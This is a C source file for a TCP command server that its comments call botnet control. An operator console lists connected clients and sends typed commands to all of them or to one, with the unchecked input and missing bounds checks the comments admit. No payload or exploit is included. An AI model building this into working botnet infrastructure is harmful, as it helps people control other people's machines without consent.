// Listens for connection and sends message to connected client
// to compile: gcc server.c -o server -lpthread

/*
Code is void of input sanitation and missing a lot of error checks.
Code does not update array when client disconnects.
Code has no functionality to exit cleanly.exir
*/

#include "simple_networking.h"
#include <poll.h>
#include <pthread.h>
#include <stdio.h>

// Function declarations
void* handle_connection(void *arguments);
void* bot_command(void *args_main);
void print_connection(connection client_con, int new_fd);
void append_pfds(struct pollfd *pfds[], int new_fd, int *fd_count, int *fd_size);
void print_welcome_message();
void print_help_screen();
void print_command_help_screen();



// Structure of arguments for use with bot_command and handle_connection functions
struct arguments
{
    int fd_count;
    int listener_fd;
    connection client_con;
    int *fd_size;
    struct pollfd *pfds;
};


static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

int main(void)
{
    connection client_con = bind_socket("127.0.0.1", 8080);

    // Set count for number of assigned file descriptors (current number of connections)
    int fd_count = 0;

    // Allocate initial memory for array based on 5 connections
    int fd_size = 5;
    struct pollfd *pfds = malloc(sizeof(*pfds) * fd_size);

    // Add listener information to array and increment count of assigned file descriptors
    int listener_fd = client_con.sock_fd;
    pfds[0].fd = listener_fd;
    pfds[0].events = POLLIN;
    fd_count++;

    print_welcome_message();

    // Create structure of arguments and allocate memory based on size of structure
    struct arguments *args;
    args = malloc(sizeof(struct arguments));

    // Assign values to argument struct for use in functions
    args->pfds = pfds;
    args->fd_count = fd_count;
    args->listener_fd = listener_fd;
    args->client_con = client_con;
    args->fd_size = &fd_size;

    


    pthread_t connection_thread, control_thread;

    // Create 2 threads - one to accept connections and one to control botnet
    pthread_create(&connection_thread, NULL, handle_connection, (void *)args);
    pthread_create(&control_thread, NULL, bot_command, (void *)args);

    // Wait for threads to finish
    pthread_join(connection_thread, NULL);
    pthread_join(control_thread, NULL);

    // Exit
    return 0;
}

// Handles incomming connections and appends information to array
void* handle_connection(void *args_main)
{

    socklen_t client_addr_size;
    int new_fd;
    struct arguments *args = (struct arguments*)args_main;

    while(1)
    {
        // Set lock
        //pthread_mutex_lock(&mutex);

        // Poll the array for events and set .revents
        int rc = poll(args->pfds, args->fd_count, -1);

        // Release lock
        //pthread_mutex_unlock(&mutex);

        // Check return code of poll(). Return error if -1
        if (rc == -1)
        {
            perror("[-] Error poll()");
            exit(1);
        }

        // Run through existing connections and look for data to read
        for (int i = 0; i < args->fd_count; i++)
        {
            // Check if socket is ready to read
            if (args->pfds[i].revents & POLLIN)
            {
                // If listener is ready to read, handle new connection
                if (args->pfds[i].fd == args->listener_fd)
                {
                    // Accept queued connection and assign new file descriptor
                    client_addr_size = sizeof(args->client_con.client_addr);
                    new_fd = accept(args->client_con.sock_fd,
                        (struct sockaddr *)&args->client_con.client_addr, &client_addr_size);

                    // Check return code of accept(). Return error if -1
                    if (new_fd == -1)
                    {
                        perror("[-] Error accept()");
                    }
                    else
                    {
                        // Set lock
                        pthread_mutex_lock(&mutex);

                        // Add new connection information to array
                        append_pfds(&args->pfds, new_fd, &args->fd_count, args->fd_size);

                        // Release lock
                        pthread_mutex_unlock(&mutex);

                        // Print connection
                        print_connection(args->client_con, new_fd);
                    }
                }
            }
        }
    }
}

// Print IP and FD of new connection
// Should this be removed? Is it necessary and scalable?
void print_connection(connection client_con, int new_fd)
{
    // Retrieve IP address of accepted client
    client_con.sa = (struct sockaddr_in *)&client_con.client_addr;
    struct in_addr ipAddr = client_con.sa->sin_addr;

    char buff[INET_ADDRSTRLEN];

    // Convert client information to readable format and print
    inet_ntop(client_con.client_addr.ss_family, &ipAddr, buff, sizeof(buff));
    printf("[+] Server: got connection from: %s on socket %d\n", buff, new_fd);
}

// Append new connection file descriptor to array
void append_pfds(struct pollfd *pfds[], int new_fd, int *fd_count, int *fd_size)
{
    // Check if array is full and double size if necessary
    if (*fd_size == *fd_count)
    {
        *fd_size *= 2;
        *pfds = realloc(*pfds, sizeof(**pfds) * (*fd_size));
    }

    // Add file descriptor to array and set event to check for read
    (*pfds)[*fd_count].fd = new_fd;
    (*pfds)[*fd_count].events = POLLIN;

    // Increment count of assigned file descriptors
    (*fd_count)++;
}

// User control
void* bot_command(void *args_main)
{
    
    char data[1024];
    struct arguments *args = (struct arguments*)args_main;
    


    while(1)
    {
        
        // Prompt user for input and remove trailing newline
        // Indicate user is in 'console' control
        printf("[Console] >> ");
        fgets(data, sizeof(data), stdin);
        data[strcspn(data, "\n")] = 0;

        // print help screen for commands to use in 'console'
        if (strcmp(data, "help") == 0)
        {
            print_help_screen();
        }

        // Display current list of connections
        // John is working to store host names, rather than client 1, 2, 3, etc..
        else if (strcmp(data, "show") == 0)
        {
            // Set lock
            pthread_mutex_lock(&mutex);

            // Iterate through array and print client information
            for (int i = 0; i < args->fd_count; i++)
             {
                printf("client %d is on fd %d\n", i, args->pfds[i].fd);
            }

            // Release lock
             pthread_mutex_unlock(&mutex);
        }
        
        
        // Enter 'command' control
        else if (strcmp(data, "command") == 0)
        {
            printf("\nEnter <help> to display list of available options under the command mode\n");
            printf("\nEnter <back> to exit command mode\n\n");
            while(1)
            {
                // Prompt user for input and remove trailing newline
                printf("[Command] >> ");
                fgets(data, sizeof(data), stdin);
                data[strcspn(data, "\n")] = 0;

                // Print list of commands to use in 'command' control
                if (strcmp(data, "help") == 0)
                {
                    print_command_help_screen();
                }

                // Display current list of connections
                // Currently unsure how to format this feature into a function...
                else if (strcmp(data, "show") == 0)
                {
                    // Set lock
                    pthread_mutex_lock(&mutex);

                    // Iterate through array and print client information
                    for (int i = 0; i < args->fd_count; i++)
                    {
                        printf("client %d is on fd %d\n", i, args->pfds[i].fd);
                    }

                    // Release lock
                    pthread_mutex_unlock(&mutex);
                }

                // Send command to ALL connections except listener
                else if (strcmp(data, "all") == 0)
                {   
                    //this allows consecutive command message to all clients
                    while(1)
                    {
                        // Prompt user for input and remove trailing newline
                        printf("[Command][All] Enter command: ");
                        fgets(data, sizeof(data), stdin);
                        data[strcspn(data, "\n")] = 0;

                        if (strcmp(data,"back") == 0)
                         {
                             break;
                         }   

                        else 
                        // Set lock
                        pthread_mutex_lock(&mutex);

                        // Iterate through array, omitting listener, and send data to each file descriptor
                        for (int i = 1; i < args->fd_count; i++)
                        {
                        send(args->pfds[i].fd, data, sizeof(data), 0);
                        }

                        // Release lock
                        pthread_mutex_unlock(&mutex);
                    }
                }

                // Send command to SINGLE client
                else if (strcmp(data, "single") == 0)
                {
                    
                    // Prompt user for input, remove trailing newline and convert input to int
                    printf("[Command][Single] Enter client: ");
                    fgets(data, sizeof(data), stdin);
                    data[strcspn(data, "\n")] = 0;
                    int num = atoi(data);
                    
                    //while loop allows consecutive command message to the client
                    while(1)
                    {
                        // Prompt user for input and remove trailing newline
                        printf("[command][single][%d] Enter command: ", args->pfds[num].fd);
                        fgets(data, sizeof(data), stdin);
                        data[strcspn(data, "\n")] = 0;
                        
                        if (strcmp(data,"back") == 0)
                        {
                            break;
                        }
                        else 
                        {    // Set lock
                            pthread_mutex_lock(&mutex);

                            // Send data to client specified by user input, based on array index
                            send(args->pfds[num].fd, data, sizeof(data), 0);

                            // Release lock
                            pthread_mutex_unlock(&mutex);
                        }
                    }
                }
                // Exit command control
                else if (strcmp(data, "back") == 0)
                {
                    break;
                }
            }
        }

        // Exit control of bot
        else if (strcmp(data, "exit") == 0)
        {
            printf("\nExiting...\n");
            exit(0);
        }
    }
}

// Function to print welcome screen
void print_welcome_message()
{
    //system("clear");


    printf("\n******************************************************************************\n");
    printf("dP   dP   dP  88888888b dP         a88888b.  .88888.  8888ba.88ba   88888888b \n");
    printf("88   88   88  88        88        d8'   `88 d8'   `8b 88  `8b  `8b  88        \n");
    printf("88  .8P  .8P  88aaaa    88        88        88     88 88   88   88  88aaaa    \n");
    printf("88  d8'  d8'  88        88        88        88     88 88   88   88  88        \n");
    printf("88.d8P8.d8P   88        88        Y8.   .88 Y8.   .8P 88   88   88  88        \n");
    printf("8888' Y88'    88888888P 88888888P  Y88888P'  `8888P'  dP   dP   dP  88888888P \n");
    printf("******************************************************************************\n\n");
    printf("This is the console page\n");
    printf("Please enter <help> to display a list of available commands\n");
    printf("Enter <exit> to terminate the program\n\n");
    
    return;
}

// Example help screen function
void print_help_screen()
{
    printf("\nCONSOLE PAGE\n\n");
    printf("Options            DESCRIPTIONS\n");
    printf("=====================================================\n");
    printf("show             : Display list of connected clients\n");
    printf("help             : List of commands from console    \n");
    printf("exit             : Terminate the program            \n");
    printf("command          : Enter command control mode       \n");
    printf("back             : Back to the previous page        \n");
    printf("=====================================================\n\n");
    return;
}

void print_command_help_screen()
{
    printf("\nCOMMAND PAGE\n\n");
    printf("OPTIONS            DESCRIPTIONS\n");
    printf("=====================================================\n");
    printf("show             : Display list of connections       \n");
    printf("help             : List of commands from console     \n");
    printf("all              : Send command to all connections   \n");
    printf("single           : Send command to a connected client\n");
    printf("back             : back to the previous page         \n");
    printf("=====================================================\n\n");
    return;
}
